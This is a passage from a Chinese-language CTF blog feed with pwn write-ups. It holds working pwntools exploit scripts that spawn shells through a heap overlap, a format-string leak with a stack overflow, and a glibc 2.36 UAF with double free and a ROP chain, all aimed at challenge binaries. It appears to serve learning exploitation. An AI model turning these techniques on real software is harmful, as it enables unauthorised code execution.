class=\"string\">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class=\"line\">io = remote(<span class=\"string\">&#x27;chall.pwnable.tw&#x27;</span>,<span class=\"number\">10102</span>)</span><br><span class=\"line\"><span class=\"comment\">#io=process(&quot;./easy_heap&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add_note</span>(<span class=\"params\">size,content</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;choice :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;size :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Content :&quot;</span>)</span><br><span class=\"line\">    io.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">del_note</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;choice :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Index :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">print_note</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;choice :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Index :&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#io.recvuntil(&quot;please input the library name:&quot;)</span></span><br><span class=\"line\"><span class=\"comment\">#io.sendline(&quot;test&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">add_note(<span class=\"number\">64</span>,<span class=\"string\">&quot;12&quot;</span>)</span><br><span class=\"line\">add_note(<span class=\"number\">32</span>,<span class=\"string\">&quot;12&quot;</span>)</span><br><span class=\"line\">del_note(<span class=\"number\">0</span>)</span><br><span class=\"line\">add_note(<span class=\"number\">64</span>,<span class=\"string\">&quot;45&quot;</span>)</span><br><span class=\"line\">print_note(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"comment\">#libc_addr = u32(io.recv(8)[4:8]) - 0x1b27b0</span></span><br><span class=\"line\">libc_addr = u32(io.recv(<span class=\"number\">8</span>)[<span class=\"number\">4</span>:<span class=\"number\">8</span>]) - <span class=\"number\">0x1b07b0</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(libc_addr))</span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\">sys_addr = libc_addr + mylibc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># add_note(8,&quot;12&quot;)</span></span><br><span class=\"line\"><span class=\"comment\"># add_note(8,&quot;34&quot;)</span></span><br><span class=\"line\"><span class=\"comment\"># del_note(3)</span></span><br><span class=\"line\"><span class=\"comment\"># del_note(4)</span></span><br><span class=\"line\">del_note(<span class=\"number\">0</span>)</span><br><span class=\"line\">del_note(<span class=\"number\">1</span>)</span><br><span class=\"line\">add_note(<span class=\"number\">8</span>,p32(sys_addr)+<span class=\"string\">b&quot;;sh\\x00&quot;</span>)</span><br><span class=\"line\">print_note(<span class=\"number\">0</span>)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-27-5%E6%9C%88%E4%B9%99%E9%98%9F%E6%9C%88%E8%B5%9B%E4%B8%89%E9%A2%98/image-20230523162442076.png\" alt=\"image-20230523162442076\"></p>\n<h1 id=\"3-fakegpt\"><a href=\"#3-fakegpt\" class=\"headerlink\" title=\"3.fakegpt\"></a>3.fakegpt</h1><h2 id=\"题目分析-1\"><a href=\"#题目分析-1\" class=\"headerlink\" title=\"题目分析\"></a>题目分析</h2><p>​\t\t存在格式化字符串漏洞,对输入的字符串做了反向处理和过滤(不过没用到),直接泄露canary和libc地址,找出onegadget,栈溢出覆盖即可</p>\n<h2 id=\"exp-2\"><a href=\"#exp-2\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mylibc = ELF(<span class=\"string\">&#x27;/root/pwn/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc.so.6&#x27;</span>)</span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./fakegpt&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 验证码</span></span><br><span class=\"line\">catpcha_line = io.recvline_contains(<span class=\"string\">b&#x27;Input the captcha&#x27;</span>)</span><br><span class=\"line\">captcha = catpcha_line.split(<span class=\"string\">b&#x27; &#x27;</span>)[-<span class=\"number\">1</span>]</span><br><span class=\"line\">io.sendline(captcha)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取libc地址</span></span><br><span class=\"line\">io.sendafter(<span class=\"string\">b&#x27;Prompt: &#x27;</span>, <span class=\"string\">f&#x27;%<span class=\"subst\">&#123;(<span class=\"number\">0xd8</span>&gt;&gt;<span class=\"number\">3</span>)+<span class=\"number\">6</span>&#125;</span>$p&#x27;</span>.encode()[::-<span class=\"number\">1</span>]) <span class=\"comment\"># __isoc99_scanf+178</span></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&#x27;FakeGPT: 0x&#x27;</span>)</span><br><span class=\"line\">addr = <span class=\"built_in\">int</span>(io.recv(<span class=\"number\">12</span>), <span class=\"number\">16</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(addr))</span><br><span class=\"line\"></span><br><span class=\"line\">libcbase = addr - <span class=\"number\">0x621c2</span></span><br><span class=\"line\"></span><br><span class=\"line\">onegadget = libcbase + <span class=\"number\">0x50a37</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(onegadget))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取canary</span></span><br><span class=\"line\">io.sendafter(<span class=\"string\">b&#x27;Prompt: &#x27;</span>, <span class=\"string\">f&#x27;%<span class=\"subst\">&#123;(<span class=\"number\">0x1a8</span>&gt;&gt;<span class=\"number\">3</span>)+<span class=\"number\">6</span>&#125;</span>$p&#x27;</span>.encode()[::-<span class=\"number\">1</span>]) <span class=\"comment\"># __isoc99_scanf+178</span></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&#x27;FakeGPT: 0x&#x27;</span>)</span><br><span class=\"line\">canary = <span class=\"built_in\">int</span>(io.recv(<span class=\"number\">16</span>), <span class=\"number\">16</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(canary))</span><br><span class=\"line\"></span><br><span class=\"line\">pause()</span><br><span class=\"line\">input3 = <span class=\"string\">b&quot;b&quot;</span>*<span class=\"number\">0x197</span> + p64(canary)+p64(<span class=\"number\">0</span>)+p64(onegadget)</span><br><span class=\"line\">io.sendline(input3[::-<span class=\"number\">1</span>])</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-26-2-36%E7%89%88%E6%9C%ACuaf%E5%88%A9%E7%94%A8/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-26-2-36%E7%89%88%E6%9C%ACuaf%E5%88%A9%E7%94%A8/",
            "title": "pwn入门-26-2.36版本uaf利用",
            "date_published": "2023-05-17T07:35:39.000Z",
            "content_html": "<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/ubuntu/511/pwn/pwn&#x27;</span></span><br><span class=\"line\">    Arch:     amd64<span class=\"number\">-64</span>-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>\n\n<p>heap: This command only works with libc debug symbols.</p>\n<p><a href=\"https://blog.csdn.net/m0_51251108/article/details/127098744\">https://blog.csdn.net/m0_51251108/article/details/127098744</a></p>\n<p>符号表 not striped</p>\n<p>name那里可以输出栈上的数据 </p>\n<h1 id=\"解题思路\"><a href=\"#解题思路\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h1><h2 id=\"堆地址泄露-利用UAF\"><a href=\"#堆地址泄露-利用UAF\" class=\"headerlink\" title=\"堆地址泄露(利用UAF)\"></a>堆地址泄露(利用UAF)</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">delete(<span class=\"number\">8</span>)</span><br><span class=\"line\">show(<span class=\"number\">8</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Name: &quot;</span>)</span><br><span class=\"line\">sec=u64(p.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\">delete(<span class=\"number\">9</span>)</span><br><span class=\"line\">show(<span class=\"number\">9</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Name: &quot;</span>)</span><br><span class=\"line\">heap_sec=u64(p.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\">heap_addr=heap_sec^sec</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(heap_addr))</span><br><span class=\"line\">stack_addr=u64(p.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(stack_addr))</span><br></pre></td></tr></table></figure>\n\n<p>​\t\tsec和heap_sec异或得到堆地址,那么它们是什么呢?</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x560399e28450</span>  <span class=\"number\">0x0000000000000000</span>      <span class=\"number\">0x0000000000000041</span>      ........A.......&lt;-- fastbins[<span class=\"number\">0x40</span>][<span class=\"number\">1</span>]</span><br><span class=\"line\"><span class=\"number\">0x560399e28460</span>  <span class=\"number\">0x0000000560399e28</span>      <span class=\"number\">0x00007ffef806f270</span>      (<span class=\"number\">.9</span>`....p.......</span><br><span class=\"line\"><span class=\"number\">0x560399e28470</span>  <span class=\"number\">0x0000000000000000</span>      <span class=\"number\">0x00007ffef806f3b8</span>      ................</span><br><span class=\"line\"><span class=\"number\">0x560399e28480</span>  <span class=\"number\">0x0000000064646464</span>      <span class=\"number\">0x0000000000000000</span>      dddd............</span><br><span class=\"line\"><span class=\"number\">0x560399e28490</span>  <span class=\"number\">0x0000000000000000</span>      <span class=\"number\">0x0000000000000041</span>      ........A.......&lt;-- fastbins[<span class=\"number\">0x40</span>][<span class=\"number\">0</span>]</span><br><span class=\"line\"><span class=\"number\">0x560399e284a0</span>  <span class=\"number\">0x00005606f9db1a78</span>      <span class=\"number\">0x00007ffef806f270</span>      x....V..p.......</span><br><span class=\"line\"><span class=\"number\">0x560399e284b0</span>  <span class=\"number\">0x0000000000000000</span>      <span class=\"number\">0x00007ffef806f3b8</span>      ................</span><br><span class=\"line\"><span class=\"number\">0x560399e284c0</span>  <span class=\"number\">0x0000000064646464</span>      <span class=\"number\">0x0000000000000000</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t 0x0000000560399e28 ^  0x00005606f9db1a78 &#x3D; 0x560399e28450</p>\n<ul>\n<li><p><code>fastbin</code> 堆指针异或加密（<code>glibc-2.32</code> 引入）</p>\n<p><a href=\"http://www.suphp.cn/anquanke/86/236186.html\">http://www.suphp.cn/anquanke/86/236186.html</a></p>\n</li>\n</ul>\n<p>需要泄露两次,两个相邻的fastbin,泄露它们fd位置的值,然后异或就得到了前面那个fastbin的地址了</p>\n<p><a href=\"https://bbs.kanxue.com/thread-272098.htm#msg_header_h2_2\">https://bbs.kanxue.com/thread-272098.htm#msg_header_h2_2</a></p>\n<h2 id=\"泄露栈地址\"><a href=\"#泄露栈地址\" class=\"headerlink\" title=\"泄露栈地址\"></a>泄露栈地址</h2><p>​\t\t为什么bk这里存储着栈地址呢?</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-26-2-36%E7%89%88%E6%9C%ACuaf%E5%88%A9%E7%94%A8/image-20230517124416111.png\" alt=\"image-20230517124416111\"></p>\n<p>​\t\t是在add的时候,放入的地址???</p>\n<p>奇怪..一步一步调试的话,栈上数据就没有..不然就有…</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-26-2-36%E7%89%88%E6%9C%ACuaf%E5%88%A9%E7%94%A8/image-20230517135521634.png\" alt=\"image-20230517135521634\"></p>\n<h2 id=\"构造double-free链-任意地址写\"><a href=\"#构造double-free链-任意地址写\" class=\"headerlink\" title=\"构造double free链,任意地址写\"></a>构造double free链,任意地址写</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">delete(<span class=\"number\">8</span>)</span><br><span class=\"line\">.........</span><br><span class=\"line\">delte(<span class=\"number\">9</span>)</span><br><span class=\"line\">........</span><br><span class=\"line\">delete(<span class=\"number\">8</span>)</span><br><span class=\"line\"><span class=\"comment\">## 构成环了</span></span><br><span class=\"line\"></span><br><span class=\"line\">victim=stack_addr-<span class=\"number\">0x20</span> <span class=\"comment\">## </span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(victim))</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):            <span class=\"comment\">## 先使用tcachebin</span></span><br><span class=\"line\">    add(i+<span class=\"number\">1</span>,<span class=\"string\">b&#x27;aaa&#x27;</span>,<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">pay1=p64(sec^victim)</span><br><span class=\"line\">add(<span class=\"number\">12</span>,pay1,<span class=\"number\">0x8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)      <span class=\"comment\">## 三个fastbin</span></span><br><span class=\"line\">add(<span class=\"number\">13</span>,pay1,<span class=\"number\">0x8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">14</span>,pay1,<span class=\"number\">0x8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">15</span>,<span class=\"string\">b&#x27;ccc&#x27;</span>,<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">show(<span class=\"number\">15</span>)</span><br></pre></td></tr></table></figure>\n\n<p>​\t\tvictim就是要写入的地址,因为有异或机制,所以要和sec异或一下,再写入</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-26-2-36%E7%89%88%E6%9C%ACuaf%E5%88%A9%E7%94%A8/image-20230517140406404.png\" alt=\"image-20230517140406404\"></p>\n<p>​\t\t为什么添加完三个fastbin,又会多了tcachebin…\t斯….和tcachebin的机制有关…在分配第一个fastbin的时候,就给他们放到tcachebin中了…</p>\n<h2 id=\"栈地址怎么来的\"><a href=\"#栈地址怎么来的\" class=\"headerlink\" title=\"栈地址怎么来的?\"></a>栈地址怎么来的?</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">15</span>,b<span class=\"number\">&#x27;</span>ccc<span class=\"number\">&#x27;</span>,<span class=\"number\">0x8</span>,b<span class=\"number\">&#x27;</span>\\x00<span class=\"number\">&#x27;</span>)</span><br><span class=\"line\">show(<span class=\"number\">15</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Name: &quot;</span>)</span><br><span class=\"line\">p.recv(<span class=\"number\">8</span>)</span><br><span class=\"line\">pie_base_addr=u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,b<span class=\"number\">&#x27;</span>\\x00<span class=\"number\">&#x27;</span>))<span class=\"number\">-0x1794</span></span><br><span class=\"line\">print(<span class=\"string\">&#x27;pie: &#x27;</span>+hex(pie_base_addr))</span><br><span class=\"line\">print(hex(stack_addr))</span><br></pre></td></tr></table></figure>\n\n<p>-0x1794要根据具体版本变化,vmmap看到基址, 两个一减就得到了</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-26-2-36%E7%89%88%E6%9C%ACuaf%E5%88%A9%E7%94%A8/image-20230517152151353.png\" alt=\"image-20230517152151353\"></p>\n<p>​\t这个地址是怎么来的呢?</p>\n<p>找不到是谁打印出的pie: 0x55b9c409d794…</p>\n<p>find 0x7ffc27616000 to 0x7ffc27805000,0x55b9c409d794</p>\n<p>​\t下断点到show函数,一步步查看</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-26-2-36%E7%89%88%E6%9C%ACuaf%E5%88%A9%E7%94%A8/image-20230517151004919.png\" alt=\"image-20230517151004919\"></p>\n<p>​\t\t是在这里打印出来的,可是为什么这里会存储着这个地址呢??</p>\n<p>​\t\t在add中malloc分配空间的时候会分配到这附近..</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-26-2-36%E7%89%88%E6%9C%ACuaf%E5%88%A9%E7%94%A8/image-20230517151632379.png\" alt=\"image-20230517151632379\"></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-26-2-36%E7%89%88%E6%9C%ACuaf%E5%88%A9%E7%94%A8/image-20230517152033215.png\" alt=\"image-20230517152033215\"></p>\n<h2 id=\"glibc地址获取\"><a href=\"#glibc地址获取\" class=\"headerlink\" title=\"glibc地址获取\"></a>glibc地址获取</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">    add(i+<span class=\"number\">30</span>,<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>,<span class=\"number\">0x3f8</span>,<span class=\"string\">b&#x27;dddd&#x27;</span>)</span><br><span class=\"line\">delete(<span class=\"number\">31</span>)</span><br><span class=\"line\">show(<span class=\"number\">31</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Name: &#x27;</span>)</span><br><span class=\"line\">p.recv(<span class=\"number\">8</span>)</span><br><span class=\"line\">lib_addr=u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))-<span class=\"number\">96</span>-<span class=\"number\">0x1f6c60</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;libc: &#x27;</span>+<span class=\"built_in\">hex</span>(lib_addr))</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t分配的0x3f8再加上33 还是啥,大小肯定超了tcache的了,就直接进入unsortedbin,然后可以从这里泄露glibc的地址</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-26-2-36%E7%89%88%E6%9C%ACuaf%E5%88%A9%E7%94%A8/image-20230517152943496.png\" alt=\"image-20230517152943496\"></p>\n<p>​\t\t-96  再减去和glibc开头的差值,就可以得到glibc加载基址</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-26-2-36%E7%89%88%E6%9C%ACuaf%E5%88%A9%E7%94%A8/image-20230517153205330.png\" alt=\"image-20230517153205330\"></p>\n<h2 id=\"构造rop链子\"><a href=\"#构造rop链子\" class=\"headerlink\" title=\"构造rop链子\"></a>构造rop链子</h2><p>​\t\t这里直接覆盖的返回地址,exit退出,就会进入rop链</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">libc = ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>)</span><br><span class=\"line\">system=lib_addr+libc.sym[<span class=\"string\">&quot;system&quot;</span>] <span class=\"comment\">#0x4c330</span></span><br><span class=\"line\">bin_sh=lib_addr+<span class=\"number\">0x1b61b4</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(system))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(bin_sh))</span><br><span class=\"line\"></span><br><span class=\"line\">ret=<span class=\"number\">0x00000000000233d1</span>+lib_addr</span><br><span class=\"line\">pop_rdi=<span class=\"number\">0x00023b65</span>+lib_addr</span><br><span class=\"line\">rop_chain=p64(ret)*<span class=\"number\">0x10</span>+p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class=\"line\"><span class=\"comment\">## edit</span></span><br><span class=\"line\">edit(<span class=\"number\">15</span>,rop_chain)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>, <span class=\"string\">&#x27;5&#x27;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h1 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h1><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">elf = <span class=\"string\">&quot;./pwn&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(elf)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">index, name, size,content</span>):</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;&gt; &#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Index: &#x27;</span>, <span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    p.sendafter(<span class=\"string\">&#x27;Name: &#x27;</span>, name)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Description size: &#x27;</span>, <span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    